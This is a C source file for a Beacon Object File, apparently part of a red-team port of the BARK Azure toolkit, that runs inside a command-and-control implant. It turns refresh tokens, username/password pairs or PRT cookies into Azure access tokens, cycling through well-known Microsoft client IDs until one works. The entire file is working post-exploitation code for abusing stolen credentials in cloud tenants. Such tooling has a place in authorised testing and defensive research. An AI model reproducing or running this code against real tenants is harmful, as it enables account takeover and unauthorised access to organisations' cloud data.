/*
 * get_access_token.c — BARK BOF
 * Get-AccessToken — Unified token acquisition for any resource
 *
 * Supports three grant types:
 *   rt  — Refresh Token grant
 *   up  — Username/Password (ROPC) grant
 *   prt — PRT Cookie flow
 *
 * Args : grantType, resource, tenantId, credential, extra, clientId
 *
 *   grantType = "rt":  credential = refreshToken
 *   grantType = "up":  credential = username, extra = password
 *   grantType = "prt": credential = prtToken,  extra = redirectUri (optional)
 *   clientId is optional — auto-tries 6 well-known Azure app IDs when omitted
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

#define PATH_SZ 512
#define BODY_SZ 8192
#define ENC_SZ  4096

void go(char *args, int alen)
{
    datap  parser;
    char  *grantType  = NULL;
    char  *resource   = NULL;
    char  *tenantId   = NULL;
    char  *credential = NULL;
    char  *extra      = NULL;
    char  *clientId   = NULL;

    BeaconDataParse(&parser, args, alen);
    grantType  = BeaconDataExtract(&parser, NULL);
    resource   = BeaconDataExtract(&parser, NULL);
    tenantId   = BeaconDataExtract(&parser, NULL);
    credential = BeaconDataExtract(&parser, NULL);
    extra      = BeaconDataExtract(&parser, NULL);
    clientId   = BeaconDataExtract(&parser, NULL);

    if (!grantType) grantType = "";
    if (!resource)  resource  = "";
    if (!tenantId)  tenantId  = "";
    if (!credential) credential = "";
    if (!extra)     extra     = "";
    if (!clientId)  clientId  = "";

    if (MSVCRT$strlen(tenantId) == 0 || MSVCRT$strlen(resource) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage:\n"
            "  bark_get_tokens rt  <resource> <tenantId> <refreshToken> [clientId]\n"
            "  bark_get_tokens up  <resource> <tenantId> <username> <password> [clientId]\n"
            "  bark_get_tokens prt <resource> <tenantId> <prtToken> [redirectUri] [clientId]\n");
        return;
    }

    int hasClientId = (MSVCRT$strlen(clientId) > 0);

    /* ----- Refresh Token ----- */
    if (MSVCRT$strcmp(grantType, "rt") == 0) {
        if (MSVCRT$strlen(credential) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] rt: <refreshToken> is required\n");
            return;
        }
        static char pathBuf[PATH_SZ];
        static char bodyBuf[BODY_SZ];
        static char encRT[ENC_SZ];

        UrlEncode(credential, encRT, sizeof(encRT));
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/%s/oauth2/token", tenantId);
        LPWSTR wp = MbsToWcs(pathBuf);
        if (!wp) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

        if (hasClientId) {
            MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
                "grant_type=refresh_token&client_id=%s&refresh_token=%s&resource=%s",
                clientId, encRT, resource);
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Get-AccessToken (RT) resource=%s\n", resource);
            BarkTokenPost(wp, bodyBuf);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Get-AccessToken (RT) resource=%s -- trying %d capability-ranked client IDs...\n",
                resource, BARK_DEFAULT_CLIENT_ID_COUNT);
            int found = 0;
            int i;
            for (i = 0; i < BARK_DEFAULT_CLIENT_ID_COUNT; i++) {
                int clientIndex = BarkClientIndexForResource(resource, i);
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying %d/%d: %s (%s)...\n",
                    i + 1, BARK_DEFAULT_CLIENT_ID_COUNT,
                    BARK_DEFAULT_CLIENT_NAMES[clientIndex],
                    BARK_DEFAULT_CLIENT_IDS[clientIndex]);
                MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
                    "grant_type=refresh_token&client_id=%s&refresh_token=%s&resource=%s",
                    BARK_DEFAULT_CLIENT_IDS[clientIndex], encRT, resource);
                if (BarkTokenPostTry(wp, bodyBuf, 1)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] client_id: %s (%s)\n",
                        BARK_DEFAULT_CLIENT_IDS[clientIndex],
                        BARK_DEFAULT_CLIENT_NAMES[clientIndex]);
                    found = 1;
                    break;
                }
                BeaconPrintf(CALLBACK_OUTPUT, "    [-] Failed.\n");
            }
            if (!found)
                BeaconPrintf(CALLBACK_ERROR,
                    "[-] All %d capability-ranked client IDs failed. Specify a clientId explicitly.\n",
                    BARK_DEFAULT_CLIENT_ID_COUNT);
        }
        HFree(wp);
        return;
    }

    /* ----- Username / Password (ROPC) ----- */
    if (MSVCRT$strcmp(grantType, "up") == 0) {
        if (MSVCRT$strlen(credential) == 0 || MSVCRT$strlen(extra) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] up: <username> and <password> are required\n");
            return;
        }
        static char pathBuf[PATH_SZ];
        static char bodyBuf[BODY_SZ];
        static char encPw[ENC_SZ];
        static char encRes[ENC_SZ];

        UrlEncode(extra, encPw, sizeof(encPw));
        UrlEncode(resource, encRes, sizeof(encRes));
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/%s/oauth2/token", tenantId);
        LPWSTR wp = MbsToWcs(pathBuf);
        if (!wp) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

        if (hasClientId) {
            MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
                "grant_type=password&client_id=%s&resource=%s&username=%s&password=%s&scope=openid",
                clientId, resource, credential, encPw);
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Get-AccessToken (UP) resource=%s user=%s\n", resource, credential);
            BarkTokenPost(wp, bodyBuf);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Get-AccessToken (UP) resource=%s user=%s -- trying %d capability-ranked client IDs...\n",
                resource, credential, BARK_DEFAULT_CLIENT_ID_COUNT);
            int found = 0;
            int i;
            for (i = 0; i < BARK_DEFAULT_CLIENT_ID_COUNT; i++) {
                int clientIndex = BarkClientIndexForResource(resource, i);
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying %d/%d: %s (%s)...\n",
                    i + 1, BARK_DEFAULT_CLIENT_ID_COUNT,
                    BARK_DEFAULT_CLIENT_NAMES[clientIndex],
                    BARK_DEFAULT_CLIENT_IDS[clientIndex]);
                MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
                    "grant_type=password&client_id=%s&resource=%s&username=%s&password=%s&scope=openid",
                    BARK_DEFAULT_CLIENT_IDS[clientIndex], resource, credential, encPw);
                if (BarkTokenPostTry(wp, bodyBuf, 1)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] client_id: %s (%s)\n",
                        BARK_DEFAULT_CLIENT_IDS[clientIndex],
                        BARK_DEFAULT_CLIENT_NAMES[clientIndex]);
                    found = 1;
                    break;
                }
                BeaconPrintf(CALLBACK_OUTPUT, "    [-] Failed.\n");
            }
            if (!found)
                BeaconPrintf(CALLBACK_ERROR,
                    "[-] All %d capability-ranked client IDs failed. Specify a clientId explicitly.\n",
                    BARK_DEFAULT_CLIENT_ID_COUNT);
        }
        HFree(wp);
        return;
    }

    /* ----- PRT Cookie ----- */
    if (MSVCRT$strcmp(grantType, "prt") == 0) {
        if (MSVCRT$strlen(credential) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] prt: <prtToken> is required\n");
            return;
        }
        const char *redirectUri = (MSVCRT$strlen(extra) > 0) ? extra
            : "https://login.microsoftonline.com/common/oauth2/nativeclient";
        if (hasClientId) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Get-AccessToken (PRT) resource=%s\n", resource);
            BarkPRTCookieFlow(credential, resource, clientId, tenantId, redirectUri);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Get-AccessToken (PRT) resource=%s -- trying %d capability-ranked client IDs...\n",
                resource, BARK_DEFAULT_CLIENT_ID_COUNT);
            int found = 0;
            int i;
            for (i = 0; i < BARK_DEFAULT_CLIENT_ID_COUNT; i++) {
                int clientIndex = BarkClientIndexForResource(resource, i);
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying %d/%d: %s (%s)...\n",
                    i + 1, BARK_DEFAULT_CLIENT_ID_COUNT,
                    BARK_DEFAULT_CLIENT_NAMES[clientIndex],
                    BARK_DEFAULT_CLIENT_IDS[clientIndex]);
                if (BarkPRTCookieFlowTry(credential, resource,
                        BARK_DEFAULT_CLIENT_IDS[clientIndex], tenantId,
                        redirectUri, 1)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] client_id: %s (%s)\n",
                        BARK_DEFAULT_CLIENT_IDS[clientIndex],
                        BARK_DEFAULT_CLIENT_NAMES[clientIndex]);
                    found = 1;
                    break;
                }
                BeaconPrintf(CALLBACK_OUTPUT, "    [-] Failed.\n");
            }
            if (!found)
                BeaconPrintf(CALLBACK_ERROR,
                    "[-] All %d capability-ranked client IDs failed. Specify a clientId explicitly.\n",
                    BARK_DEFAULT_CLIENT_ID_COUNT);
        }
        return;
    }

    BeaconPrintf(CALLBACK_ERROR,
        "[-] Unknown grantType '%s'. Use rt, up, or prt.\n", grantType);
}
